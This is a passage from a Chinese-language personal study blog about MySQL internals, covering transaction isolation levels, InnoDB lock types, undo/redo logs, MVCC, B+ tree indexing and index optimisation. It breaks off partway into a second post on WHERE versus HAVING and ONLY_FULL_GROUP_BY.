<li>查看数据库支持的存储引擎：<code>show engines</code></li>
<li>查看自己的表使用的引擎：<code>show table status from 数据库名 where name = &#39;表名&#39;;</code></li>
<li>修改表的存储引擎：<code>ALTER TABLE 表名 ENGINE=引擎名称;</code></li>
<li>查看是否是自动提交：<code>show variables like &#39;autocommit&#39;;</code></li>
<li>关闭自动提交: <code>SET AUTOCOMMIT = 0;</code> </li>
<li>打开自动提交：<code>set AUTOCOMMIT = 1;</code></li>
<li>事务的隔离级别有哪些：<ol>
<li><code>Read Uncommitted</code>（读取未提交内容）<ul>
<li>别人开启事务，修改数据，但还未提交，你这边就读取到了修改的数据，存在脏读现象</li>
</ul>
</li>
<li><code>Read Committed</code>（读取提交内容）<ul>
<li>存在不可重复读现象，意思就是当A在开启事务后，先查询了一次数据，在这期间B也开启事务，并commit了一条数据，当A再查询的时候数据发现查询到的数据不一致了，</li>
</ul>
</li>
<li><code>Repeatable Read</code>（可重读）<ul>
<li>当A开启一个事务后，读取的数据是锁死的，不会因为外界的修改而读取到不同的内容。但会有幻读的可能</li>
</ul>
</li>
<li><code>Serializable</code>（可串行化）<ul>
<li>隔离级别最高，事务必须一个个进行，相当于Java中的synchronize，但是效率很低。安全性最高</li>
</ul>
</li>
</ol>
</li>
<li>查看数据库支持的事务隔离级别：<code>SELECT @@global.tx_isolation;</code></li>
<li>修改事务的隔离级别：（seesion表示当前作用域下（立刻生效），如果想改变全局作用域使用：global（需要从新建立Session生效），这里修改只是临时操作，要永久操作需要在配置文件中修改）<ol>
<li><code>set session transaction isolation level repeatable read;</code> 设置会话隔离级别为可重复读</li>
<li><code>set session transaction isolation level read uncommitted;</code> 设置会话隔离级别为读未提交</li>
<li><code>set session transaction isolation level read committed;</code> 设置会话隔离级别为读已提交</li>
<li><code>set session transaction isolation level serializable;</code> 设置会话隔离级别为可串行化</li>
</ol>
</li>
</ol>
<h3 id="各个隔离级别存在问题的概念"><a href="#各个隔离级别存在问题的概念" class="headerlink" title="各个隔离级别存在问题的概念"></a>各个隔离级别存在问题的概念</h3><ol>
<li>脏读：好比我们写作文打草稿，写好了再上传提交，应只能看到最后提交的作品，现在是你打草稿我们都能看到了。</li>
<li>不可重复读：写作文，我们打草稿的时候，实在不会写，上网翻翻别人提交上传的优秀作文，抄一会儿不小心刷新页面了，发现尼玛怎么和之前不一样了。原来是别人又修改了一下，然后从新上传了。不可重复读重点在update和delete操作，官网写的</li>
<li>可重复读：与上面相对应，当我打草稿抄作文的时候，不管原作者怎么提交修改，我这边只能看到最初我打草稿那时看到的。相当于我为了保证数据不变，我截了个图。只看这张图。</li>
<li>幻读：侧重点在于数据的增加，比方说作文上传后，需要单独放在一张桌子上，我在打草稿前看了一眼，发现桌子上是空的，等我写的差不多了，我再看一眼桌子还是空的，但等我去放作文的时候，发现明明我看不到有东西，但显示已经有一个别人的作文了。仿佛自己出现了幻觉。幻读侧重于insert语句</li>
</ol>
<h2 id="锁分类"><a href="#锁分类" class="headerlink" title="锁分类"></a>锁分类</h2><h3 id="共享锁："><a href="#共享锁：" class="headerlink" title="共享锁："></a>共享锁：</h3><p>​        也称为读锁，多个事务间可共享读锁，都可以获取到数据，但不能修改数据，否则可能造成死锁问题。</p>
<p>加锁：<code>select * from student where id = 1 lock in share mode</code></p>
<p>释放锁：<code>commit/rollback</code></p>
<h3 id="排他锁"><a href="#排他锁" class="headerlink" title="排他锁"></a>排他锁</h3><p>​        也叫做写锁，写锁与其他锁并不能共存，也就是说与共享锁，和其他排他锁都是互斥的。如果一个事务获取了一个数据行的排他锁，其他事务就也不能再获取这行的锁了，获取到锁的事务可以进行读和写</p>
<p>加锁：</p>
<p>​    自动：在<code>delete/update/insert</code>中默认加锁</p>
<p>​    手动：<code>select * from student where id = 1 for update;</code></p>
<p>释放锁：<code>commit/rollback</code></p>
<h3 id="意向锁（表级锁）"><a href="#意向锁（表级锁）" class="headerlink" title="意向锁（表级锁）"></a>意向锁（表级锁）</h3><p>​        意向锁是由数据引擎自己维护的，用户无法自己操作意向锁，</p>
<h4 id="IS意向共享锁"><a href="#IS意向共享锁" class="headerlink" title="IS意向共享锁"></a>IS意向共享锁</h4><p>​        一个数据行加入共享锁之前必须先获取到该表的IS锁</p>
<h4 id="IX意向排他锁"><a href="#IX意向排他锁" class="headerlink" title="IX意向排他锁"></a>IX意向排他锁</h4><p>​        一个事务在一个数据行加他排他锁之前需要获取到IX锁</p>
<blockquote>
<p>上面的意向锁到底有什么用？</p>
<blockquote>
<p>一个事务成功给一个表加上表锁的前提是什么？</p>
</blockquote>
</blockquote>
<p>​    肯定是这个表中任意数据行没有加上别的锁，那我当想给一个表加表锁时，难倒一行一行去判断有没有加锁操作？效率太低，且当你判断完第一个没问题，去判断第二个时，第一个被一个事务加锁了，你也不知道啊，所以使用意向锁，可以提高加表锁的效率，只要某个数据行有了意向排它锁，就说明不能加表锁    </p>
<blockquote>
<p>提问环节：</p>
<ol>
<li>行锁锁的是什么？ 是一行数据？是一个字段？还是索引？</li>
<li>当我们不给表加索引时，表是否含有主键索引？</li>
</ol>
<p>这里有现成的实验：<a href="https://blog.csdn.net/weixin_43935927/article/details/109438506">https://blog.csdn.net/weixin_43935927/article/details/109438506</a></p>
</blockquote>
<p>​    结论： 锁锁住的是索引，当表中没有设定主键索引时，会默认找一个非空唯一的字段加主键索引，如果没有这个字段会使用一个隐藏字段加入主键索引。</p>
<hr>
<p><img src="../../typora-user-images/image-20220810182237613.png" alt="image-20220810182237613"></p>
<h3 id="Record-Lock：记录锁"><a href="#Record-Lock：记录锁" class="headerlink" title="Record Lock：记录锁"></a>Record Lock：记录锁</h3><p>条件：唯一性索引（唯一、主键）等值查询，精准匹配到一个索引。</p>
<p><code>select * from t2 where id = 4 for update;</code> 锁住id = 4的数据</p>
<h3 id="Gap-Lock：间隙锁"><a href="#Gap-Lock：间隙锁" class="headerlink" title="Gap Lock：间隙锁"></a>Gap Lock：间隙锁</h3><p>条件：记录不存在，当我查询并加锁时，发现并没有击中索引，而是落入在一个索引的区间内，那么就会加一个间隙锁。那既然没数据我加间隙锁能干嘛？</p>
<p>防止插入，当你有一个间隙锁的时候，就不能再给这个间隙加数据，等等。。那这不就保证了不会在我看不见的情况下，别人突然insert一条数据了嘛。。。幻读的解决似乎在这里能找到解决的办法</p>
<p><img src="../../typora-user-images/image-20220810182800083.png" alt="image-20220810182800083"></p>
<h3 id="Next-Key-Lock：临键锁"><a href="#Next-Key-Lock：临键锁" class="headerlink" title="Next-Key Lock：临键锁"></a>Next-Key Lock：临键锁</h3><p>条件：范围查询，包含记录和区间。这里要注意临键是左开右闭的，(x,y]</p>
<p><img src="../../typora-user-images/image-20220810183202191.png" alt="image-20220810183202191"></p>
<p>​        所以当有这几个锁的时候解决了什么问题呢？那就是解决了在<code>repeatable Read</code>事务隔离级别下，幻读的影响，当有了间隙锁，这个区间虽然你看不到，但你相当于已经对这个范围都加锁了，其他数据无法进行insert，所以最后的结论是下图：</p>
<p><img src="../../typora-user-images/image-20220810183658382.png" alt="image-20220810183658382"></p>
<blockquote>
<p>当前读与快照读的底层分析</p>
</blockquote>
<p><img src="../../typora-user-images/mysqlMvcc.drawio.png" alt="mysqlMvcc.drawio"></p>
<hr>
<h2 id="ACID的实现原理"><a href="#ACID的实现原理" class="headerlink" title="ACID的实现原理"></a>ACID的实现原理</h2><h3 id="atomicity原子性"><a href="#atomicity原子性" class="headerlink" title="atomicity原子性"></a>atomicity原子性</h3><blockquote>
<p>定义我们都知道，一个事务操作内，要么都成功，要么都失败，那Mysql是如何保证的？</p>
</blockquote>
<p>​    维护了一个<code>undo.log</code>文件，也就是我们在事务操作前都会记录一条反向操作SQL，当<code>commit</code>时，则<code>undo.log</code>标志该事务已经结束。如果出现异常，则进行<code>rollback</code>操作，通过<code>undo.log</code>文件执行反向操作，进行数据回滚。比如：</p>
<p>当我们执行：<code>update user set name = &quot;李四&quot; where id = 1;   *修改之前name=张三*</code></p>
<p>undo文件记录：<code>update user set name = &quot;张三&quot; where id = 1;</code></p>
<blockquote>
<p>这里在回滚的时候，会不会将这期间修改的数据给改了？</p>
</blockquote>
<p>​    不会，因为在进行修改操作时，自动加排他锁了。</p>
<h3 id="durability持久性"><a href="#durability持久性" class="headerlink" title="durability持久性"></a>durability持久性</h3><blockquote>
<p>定义：如果一个事务提交后，数据的修改是永久性的。</p>
</blockquote>
<p>​        维护一个<code>redo.log</code>文件，背景是我们知道磁盘IO是一个很慢的操作，所以Mysql也维护了一份Buffer缓冲区，操作都会先到缓冲区，最后同步到磁盘中。但缓冲区最大的问题就是数据的不安全，所以引入了<code>redo.log</code>文件，数据会先同步到<code>redo log buffer</code>中，<code>redo log buffer</code> 也是redo.log文件的缓冲区，然后事务提交后按照我们的约定再刷盘到redo.log文件中。</p>
<p><img src="../../typora-user-images/image-20230130213820352.png" alt="image-20230130213820352"></p>
<blockquote>
<p>那这里也会存在问题：</p>
</blockquote>
<ol>
<li> redo log buffer 文件能否保证数据不丢失?</li>
</ol>
<p>​        Mysql中数据操作单元是一个数据页，16k，<code>redo.log</code>中则记录的是对磁盘上的某个表空间的某个数据页的某一行数据的某个字段做了修改，修改后的值为多少，它记录的是对物理磁盘上数据的修改，因此称之为物理日志。类似于Redis中的AOF操作追加</p>
<p>​        <code>redo log buffer</code>是在commit之前就记录了，如果在commit之后再记录就不可能保证数据安全，因为commit后一瞬间挂机不就完了。所以当commit时，我们可以根据<code>innodb_flush_log_at_trx_commit</code> 来决定将<code>redo log buffer</code>什么时候刷盘到<code>redo.log</code>文件中。</p>
<ul>
<li><strong>设置为0的时候，表示每次事务提交时不进行刷盘操作，等待主线程每秒刷盘</strong></li>
<li><strong>设置为1的时候，表示每次事务提交时都同步进行刷盘操作（默认值，因为够安全）</strong></li>
<li><strong>设置为2的时候，表示每次事务提交时都异步，只把redo log buffer内容写入page cache</strong></li>
</ul>
<ol start="2">
<li>为什么宁可写到<code>redo.log</code>文件中，而不是直接写到数据库文件中？</li>
</ol>
<p>redo.log使用的顺序IO，只追加修改的数据，而<code>Mysql的Buffer</code>为随机IO，写入数据文件，是按照一个数据页(16k)写入的。</p>
<h3 id="isolation隔离性"><a href="#isolation隔离性" class="headerlink" title="isolation隔离性"></a>isolation隔离性</h3><p>隔离性保证有两种：</p>
<ol>
<li>像Java中一样加入锁，每个事务在操作时，只有一个事务获取到锁并操作，效率低</li>
<li>MVCC多版本并发控制（Mysql中对RC和RR的默认管理）</li>
</ol>
<h4 id="MVCC"><a href="#MVCC" class="headerlink" title="MVCC"></a>MVCC</h4><p><code>select</code>读取分为：快照读和当前读</p>
<p>快照读就好像是照了张相，数据是以前了，不一定准确。</p>
<p>当前读表示读取到的就是最新的数据，比如：update，insert，delete就是当前读，会先获取最新数据，加入行锁。如果想让<code>select</code>也为当前读：<code>select * from table for update || select * from table lock in share mode </code></p>
<blockquote>
<p>MVCC是基于快照读的。但又有不同，我们下面来看一下RC和RR底层到底有什么不同？</p>
</blockquote>
<p>首先MVCC的关键在于<code>版本链，ReadView视图，事务ID</code>来区分。可以看这里的图：</p>
<p><img src="../../typora-user-images/mysqlMvcc.drawio.png" alt="mysqlMvcc.drawio"></p>
<p>至于RC与RR的区别则在于生成ReadView时机不同，在RC中每次select 都会生成一个readView，所以数据也在不断更新</p>
<p>而RR则是以事务为单位，当第一个select时生成ReadView，后面再次select就共用一个。所以叫可重复读</p>
<blockquote>
<p>为什么说幻读可被解决：这里分为当前读与快照读</p>
</blockquote>
<p>当前读：默认加入了间隙锁，保证这一段区间内读的时候也加锁了，别人无法操作</p>
<p>快照读：则是外界的修改，事务内只读取一次，所以也不影响。</p>
<p>​    外界对幻读的定义也并不是统一的。这里我的理解是，幻读是当事务执行后，虽然读取不到该数据，但是却可以修改或删除该数据，就像幻觉一样，而修改与删除是因为使用的当前读所以可以获取到最新的数据</p>
<h3 id="consistency一致性"><a href="#consistency一致性" class="headerlink" title="consistency一致性"></a>consistency一致性</h3><p><code>ADI</code>特性是为了保证<code>C</code>数据的一致性。</p>
<h2 id="索引底层：B-树"><a href="#索引底层：B-树" class="headerlink" title="索引底层：B+树"></a>索引底层：B+树</h2><p><a href="https://www.cs.usfca.edu/~galles/visualization/Algorithms.html">https://www.cs.usfca.edu/~galles/visualization/Algorithms.html</a> 动态图显示</p>
<p>我们都知道Mysql索引底层是B+树，那为什么使用B+数呢？能不能像<code>HashMap或红黑树</code>使用索引？</p>
<ol>
<li>Hash结构</li>
</ol>
<p>​        元素插入与访问都非常的快，如果Hash值碰撞，也可以使用链表。但当数据量太多就查询太慢了，就好像HashMap超过边界变为红黑树。所以Hash的缺点有两个：</p>
<ul>
<li>在数据量大时，哈希碰撞后转为顺序查找，查询效率太低</li>
<li><code>Hash</code>值无序，在我们使用索引时经常遇到范围查找，Hash没法优化</li>
</ul>
<ol start="2">
<li>平衡二叉树</li>
</ol>
<p>​        平衡二叉树的特点就是二叉树结构，左右高度不会超过1层，会有自平衡。但随着树高度的增加，查找就越慢，而且如果我们查找范围数据时，需要不断回旋搜索。比如说<code>select * from table where id &gt;= 10</code>,当我们在树中找到10这个节点，剩下节点需要回旋搜索</p>
<ol start="3">
<li>B树</li>
</ol>
<p>​        多个节点合在一起，这样树的高度就降低了，查询速度是要比平衡二叉树解决了，但仍然存在回旋查找的问题</p>
<ol start="4">
<li>B+树</li>
</ol>
<p>​        解决了回旋查找的问题，整体结构相当于B树的形成，然后每个节点形成一个链表的关系，这样就没有了回旋查找的问题</p>
<blockquote>
<p>这里我是看了上面动态图插入流程体会到的，可能有些错误，还是需要有时间了解具体实现。</p>
</blockquote>
<h2 id="索引失效问题"><a href="#索引失效问题" class="headerlink" title="索引失效问题"></a>索引失效问题</h2><blockquote>
<p>select 前加入 explain 可显示是否使用了索引，其中属性值：</p>
<blockquote>
<p>id:选择标识符<br>select_type:表示查询的类型。<br>table:输出结果集的表<br>partitions:匹配的分区<br>type:表示表的连接类型（ ALL、index、range、 ref、eq_ref、const、system、NULL（从左到右，性能从差到好））<br>possible_keys:表示查询时，可能使用的索引<br>key:表示实际使用的索引<br>key_len:索引字段的长度<br>ref:列与索引的比较<br>rows:扫描出的行数(估算的行数)<br>filtered:按表条件过滤的行百分比<br>Extra:执行情况的描述和说明</p>
</blockquote>
</blockquote>
<p>索引失效的情况网上有许多测试数据，可以直接查找，我们这里从底层说明为什么索引会失效。下图是对<code>a字段和b字段加入联合索引，索引底层B+树的样子</code></p>
<p><img src="../../typora-user-images/image-20221116173602058.png" alt="image-20221116173602058"></p>
<p>通过上面的图我们能发现几个规则：</p>
<ol>
<li>a的值是有序的，b的值是无序的</li>
<li>当a相同时，b是有序的，这在我们多个排序条件时，如果第一个相同，再排第二个是一致的</li>
</ol>
<blockquote>
<p>分析情况来说明</p>
</blockquote>
<p>​    <code>like &quot;%i&quot; || like &quot;i%&quot; || like &quot;%i%&quot;</code> 之间的不同</p>
<ul>
<li>like ‘%i’ 表示前面什么都可以，以i结尾，根据上图，当a不同时，b是无序的，所以无法使用索引</li>
<li>like ‘i%’ 表示以i开头，根据上图a相同时，b是有序的，所以可以用到索引</li>
<li>like ‘%i%’ 和情况1一样，无法使用索引</li>
</ul>
<blockquote>
<p>​    索引失效的最本质原因就是：B+索引在底层的存储是有序的，如果要使用索引也应该有序，当使用联合索引时，应保证索引从左至右。这条规则对普通索引也适用。比如说对<code>name</code>加索引，有三个值，<code>abc,acb,aaa</code>，在添加索引时先看第一位，发现都是a，再看第二位，发现不一样了，这时也是按顺序排序的，最终一定是<code>aaa,abc,acb</code>,这里最简单的方式：我们已经知道索引的结构是B+树，通过上面的网址自己插入这几个值，看是怎么排序的。</p>
</blockquote>
<h2 id="MyISAM-和-Innodb的索引区别"><a href="#MyISAM-和-Innodb的索引区别" class="headerlink" title="MyISAM 和 Innodb的索引区别"></a>MyISAM 和 Innodb的索引区别</h2><blockquote>
<p>MyIsam 数据和索引是分为两个文件存储的，左边的图为索引，右边为数据，索引的key为主键id，value为数据的地址，</p>
<p>不管是主键索引还是普通索引都是通过地址去查找数据</p>
</blockquote>
<p><img src="../../typora-user-images/image-20221116181734434.png" alt="image-20221116181734434"></p>
<blockquote>
<p>Innodb 的索引，也叫聚簇索引，索引与数据是在一起的</p>
<blockquote>
<p>​    左边的图，每个节点上的key是唯一主键ID，值就是这一整行的数据，当通过主键查询时速度最快</p>
<p>​    右边的图，以name为索引，每个节点的key是name，value则是主键ID，再通过ID去主键索引中获取数据（这里如果我们没有设置主键索引，Innodb会找唯一自增索引去当做主键索引，如果这个也没有，会使用隐藏字段生成一个主键）</p>
<p>​    索引：分为主键索引和普通索引，主键索引直接拿数据，普通索引找主键索引找数据（性能相对比MyISAM低），</p>
</blockquote>
</blockquote>
<p><img src="../../typora-user-images/image-20221116181403045.png" alt="image-20221116181403045"></p>
<hr>
<h2 id="百万级数据索引优化"><a href="#百万级数据索引优化" class="headerlink" title="百万级数据索引优化"></a>百万级数据索引优化</h2><ol>
<li><p>索引失效：</p>
<ul>
<li>计算：如：<code>+ ,- ,* ,/ ,!= ,&lt;&gt; ,is null ,is not null, or</code></li>
<li>函数：如：<code>sum(),round()等等</code></li>
<li>手动/自动类型转化，如: id = “1”，id本身是数字，给写成字符串了（这里我用mysql8发现也可以使用索引）</li>
</ul>
</li>
<li><p>尽量少使用<code>select * 因为这会导致无法使用覆盖索引</code>，覆盖索引的意思是 <code>select name where name = &#39;&#39; and  age = &#39;&#39;</code>，name在查询条件的覆盖范围内，select * 也会查询到许多不必要的字段，导致网络传输的性能损耗。</p>
</li>
<li><p><code>like %</code>操作应注意，应避免%开头，但如果是覆盖索引的话，是可以用到索引的！！！, 也就是说使用%i,在使用覆盖索引的情况下，是可以使用索引查询到的</p>
</li>
<li><p><code>Order by</code>如果使用覆盖索引的话也可以被优化用索引，否则数据会被存入内存中的一个空间，再进行排序，而不是利用索引进行排序</p>
</li>
<li><p>用Java操作，要比数据库本身操作快的多</p>
</li>
</ol>
<blockquote>
<p>联合索引与单个索引的区别</p>
</blockquote>
<p>​    联合索引遵从最左前缀法则，当我们给<code>a,b,c</code>加入联合索引时，在<code>a || a,b || a,b,c</code>查询时都会使用到索引，联合索引相当于对多个列建索引，并且只建一次。</p>
<p>​    单个索引时，给<code>a ,b ,c</code>单独加入索引时，当查询<code>a,b,c</code>时，只有最前面的索引被使用或者被索引联合合并优化（<code>and 和 or 时</code>），而且如果多个字段添加独立索引，也会导致资源的浪费。</p>
<h3 id="前缀索引"><a href="#前缀索引" class="headerlink" title="前缀索引"></a>前缀索引</h3><p>​        根据存储器读取与索引的底层结构，我们知道索引字段应尽可能小，因为过长会导致二级索引也会很大。当我们需要对<code>varchar,text</code>等文本加索引时，可以只截取一部分进行索引。那到底该如何选择呢？</p>
<p>​        使前缀的选择性与完整的选择性越近越好。也就是说一个索引能匹配到越少的值说明越优秀。比如说：一个索引就能匹配到一个值  和  一个索引匹配到五个值，再从这五个值中找到自己需要那个， 那肯定是前者的性能更好。那该如何确定选择多长作为前缀索引呢？</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token keyword">distinct</span> city<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token comment"># 计算完整列的选择性</span>

<span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token keyword">distinct</span> <span class="token keyword">left</span><span class="token punctuation">(</span>city<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sel3<span class="token punctuation">,</span>
			 <span class="token function">count</span><span class="token punctuation">(</span><span class="token keyword">distinct</span> <span class="token keyword">left</span><span class="token punctuation">(</span>city<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sel4<span class="token punctuation">,</span>
			 <span class="token function">count</span><span class="token punctuation">(</span><span class="token keyword">distinct</span> <span class="token keyword">left</span><span class="token punctuation">(</span>city<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sel5<span class="token punctuation">,</span>
			 <span class="token function">count</span><span class="token punctuation">(</span><span class="token keyword">distinct</span> <span class="token keyword">left</span><span class="token punctuation">(</span>city<span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sel6<span class="token punctuation">,</span>
			 <span class="token function">count</span><span class="token punctuation">(</span><span class="token keyword">distinct</span> <span class="token keyword">left</span><span class="token punctuation">(</span>city<span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">as</span> sel7
			 <span class="token keyword">from</span> city_demo<span class="token punctuation">;</span> 
<span class="token comment"># 看哪种情况的值越靠近上面的完整列的选择性</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​        仅仅看平均选择性是不够的，可能会出现数据不平衡的情况： 这里最常出现的前缀出现的次数比最常出现的城市出现的次数要多的多，就属于不平衡。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">as</span> c<span class="token punctuation">,</span> <span class="token keyword">left</span><span class="token punctuation">(</span>city<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token keyword">as</span> pref
<span class="token keyword">from</span> city_demo <span class="token keyword">group</span> <span class="token keyword">by</span> pref <span class="token keyword">order</span> <span class="token keyword">by</span> c <span class="token keyword">desc</span> <span class="token keyword">limit</span> <span class="token number">5</span><span class="token punctuation">;</span>

<span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">as</span> c<span class="token punctuation">,</span> city <span class="token keyword">as</span> city
<span class="token keyword">from</span> city_demo <span class="token keyword">group</span> <span class="token keyword">by</span> city <span class="token keyword">order</span> <span class="token keyword">by</span> c <span class="token keyword">desc</span> <span class="token keyword">limit</span> <span class="token number">5</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="多列索引"><a href="#多列索引" class="headerlink" title="多列索引"></a>多列索引</h3><p>​        也就是我们上面说的联合索引，多列形成一个索引，这里遵从最左前缀原则，需要注意索引建立的顺序。</p>
<p>如果给 <code>a,b,c</code>列加联合索引，索引生效的情况：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">where</span> a <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> b <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> c <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">where</span> a <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> b <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">where</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">where</span> a <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> b <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span> <span class="token operator">and</span> c <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment"># 这里仅限 b 的字段很少</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>联合索引 与 每列加索引的区别：</p>
<p>​    联合索引只建立一次，多列索引每列建立一个</p>
<p>​    查询是联合索引性能更好，多列索引可能会用到索引合并(性能低)</p>
</blockquote>
<h3 id="聚簇索引"><a href="#聚簇索引" class="headerlink" title="聚簇索引"></a>聚簇索引</h3><p>也就是InnDB中的主键索引，因为主键索引的数据结构是索引与完整数据在一起，所以访问速度极快，</p>
<p>需要注意：一般情况下，主键用递增最好，因为是顺序插入B+树，但在高并发下可能导致锁竞争。</p>
<h3 id="覆盖索引"><a href="#覆盖索引" class="headerlink" title="覆盖索引"></a>覆盖索引</h3><h3 id="索引扫描做排序"><a href="#索引扫描做排序" class="headerlink" title="索引扫描做排序"></a>索引扫描做排序</h3><h3 id="冗余和重复索引"><a href="#冗余和重复索引" class="headerlink" title="冗余和重复索引"></a>冗余和重复索引</h3>]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL语句： where 和 having 的区别</title>
    <url>//post/%E6%95%B0%E6%8D%AE%E5%BA%93/SQL%E8%AF%AD%E5%8F%A5%EF%BC%9A%20where%20%E5%92%8C%20having%20%E7%9A%84%E5%8C%BA%E5%88%AB.html</url>
    <content><![CDATA[<h1 id="SQL语句：-where-和-having-的区别"><a href="#SQL语句：-where-和-having-的区别" class="headerlink" title="SQL语句： where 和 having 的区别"></a>SQL语句： where 和 having 的区别</h1><blockquote>
<p>分组查询时，select的字段（不包含聚合函数的字段）是否一定要都在group by的字段中?</p>
</blockquote>
<p>例如：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> name<span class="token punctuation">,</span>age<span class="token punctuation">,</span><span class="token function">sum</span><span class="token punctuation">(</span>money<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>上面所说情况在Mysql5.7之后：<code>sql_mode=only_full_group_by</code> 情况下适用，可以通过 <code>select @@sql_mode;</code>查询自己的<code>sql_mode</code></p>
<p>解决方案：</p>
<ol>
<li>修改sql_mode，删除：<code>SET @@sql_mode = sys.list_drop(@@sql_mode, &#39;ONLY_FULL_GROUP_BY&#39;);</code>（不推荐）</li>
<li>group by 主键字段</li>
<li>group by 唯一非空字段</li>
<li>select 字段集合 from table group by 相同字段集合</li>
</ol>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> @<span class="token variable">@sql_mode</span><span class="token punctuation">;</span>

<span class="token keyword">SET</span> @<span class="token variable">@sql_mode</span> <span class="token operator">=</span> sys<span class="token punctuation">.</span>list_add<span class="token punctuation">(</span>@<span class="token variable">@sql_mode</span><span class="token punctuation">,</span> <span class="token string">'ONLY_FULL_GROUP_BY'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">SET</span> @<span class="token variable">@sql_mode</span> <span class="token operator">=</span> sys<span class="token punctuation">.</span>list_drop<span class="token punctuation">(</span>@<span class="token variable">@sql_mode</span><span class="token punctuation">,</span> <span class="token string">'ONLY_FULL_GROUP_BY'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>为什么在Mysql5.7版本后开启了：ONLY_FULL_GROUP_BY ？</p>
</blockquote>
<p>主要是为了避免查询selelct语句当中出现语义不明确的列，对于一些比较严谨的语义来说它的作用相当重要，这是一个规范。</p>
<p>简单的说一旦设置ONLY_FULL_GROUP_BY启用，那么使用group by 语句时，你的输出语句当中只能是使用了聚合函数的字段和group by的字段，若有其他不明确的字段则报错。</p>
<blockquote>
<p>group by having 与 where 的区别？</p>
</blockquote>
<p>​    这里我们必须明确sql语句的执行过程：</p>
<p><code>from --&gt; where --&gt; group by --&gt; having -- &gt; order by --&gt; select;</code></p>
<p>​    可以看到where是在分组前进行的条件筛选</p>
<p>​    having 是对分组后的数据进行条件筛选，保存符合条件的组数据，下面举个栗子：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 创建学生信息表</span>
<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token identifier"><span class="token punctuation">`</span>student1<span class="token punctuation">`</span></span>
<span class="token punctuation">(</span>
    <span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span>    <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>     <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">COMMENT</span> <span class="token string">'学号'</span><span class="token punctuation">,</span>
    <span class="token identifier"><span class="token punctuation">`</span>name<span class="token punctuation">`</span></span>  <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">COMMENT</span> <span class="token string">'姓名'</span><span class="token punctuation">,</span>
